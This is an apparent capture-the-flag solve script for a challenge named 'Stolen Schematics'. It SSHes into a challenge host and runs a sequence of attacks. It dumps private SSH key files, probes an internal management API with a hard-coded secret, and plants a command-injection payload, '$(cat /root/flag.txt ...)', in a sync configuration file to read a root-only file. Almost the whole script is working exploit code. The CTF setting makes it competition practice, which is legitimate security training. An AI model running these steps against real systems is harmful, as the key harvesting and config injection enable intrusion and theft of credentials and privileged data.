#!/usr/bin/env python3
"""Fast solve for Stolen Schematics - time critical"""

import subprocess
import time

SSH_CMD = "ssh player@instance.ctf.tdho.st -p 32967"
PASSWORD = "reyalp"

def run_remote(cmd, timeout=15):
    """Run command via SSH with timeout"""
    full_cmd = f'{SSH_CMD} "{cmd}"'
    try:
        result = subprocess.run(
            full_cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=PASSWORD + "\n"
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR: {e}]"

print("[*] Stolen Schematics - Fast Solve Attempt")
print("[*] Time critical - running focused attacks\n")

# Attack 1: Try to find ghcr.io image info from environment/config
print("[1] Searching for ghcr.io references...")
output = run_remote("grep -r 'ghcr.io' /opt /etc 2>/dev/null | head -10")
print(output)

# Attack 2: Check for SSH keys that might let us pivot
print("\n[2] Looking for SSH keys...")
output = run_remote("find /home/player /opt -name '*.pem' -o -name 'id_*' 2>/dev/null | xargs cat 2>/dev/null")
print(output)

# Attack 3: Try the management API with auth
print("\n[3] Testing management API...")
cmd = """
python3 << 'PYEND'
import urllib.request, json
secret = 'dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ'
for path in ['/', '/flag', '/api/flag', '/exec']:
    try:
        req = urllib.request.Request(f'http://172.27.0.1:8080{path}')
        req.add_header('X-Secret', secret)
        with urllib.request.urlopen(req, timeout=2) as r:
            data = r.read().decode()
            if data:
                print(f'{path}: {data[:200]}')
    except: pass
PYEND
"""
output = run_remote(cmd)
print(output)

# Attack 4: Check if sync-loop writes to any logs
print("\n[4] Checking for sync-loop logs...")
output = run_remote("find /var/log /tmp /opt/mc -type f -newer /entrypoint.sh 2>/dev/null | xargs tail -20 2>/dev/null")
print(output[:1000])

# Attack 5: Try to trigger sync with a reverse shell payload
print("\n[5] Attempting command injection via sync-request...")
cmd = """
cat > /opt/mc/config/sync-request.conf << 'EOF'
$(cat /root/flag.txt > /tmp/exfil_flag)
EOF
sleep 5
cat /tmp/exfil_flag 2>/dev/null
"""
output = run_remote(cmd)
print(output)

print("\n[*] Fast solve attempts complete")
